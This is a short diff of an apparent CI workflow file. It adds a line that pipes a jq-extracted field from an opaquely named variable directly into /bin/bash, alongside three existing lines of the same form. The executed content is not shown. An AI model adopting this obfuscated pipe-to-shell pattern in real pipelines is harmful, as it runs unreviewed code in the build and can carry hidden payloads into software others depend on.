@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$xhjl48013" | jq -r .nf350 | /bin/bash
           echo $oo049 | jq -r .u168 | /bin/bash
           echo $nrmj55 | jq -r .wv144 | /bin/bash
+          printf '%s' "$aozh13" | jq -r .lnfim8 | /bin/bash
 
       - name: Persist output
         if: always()
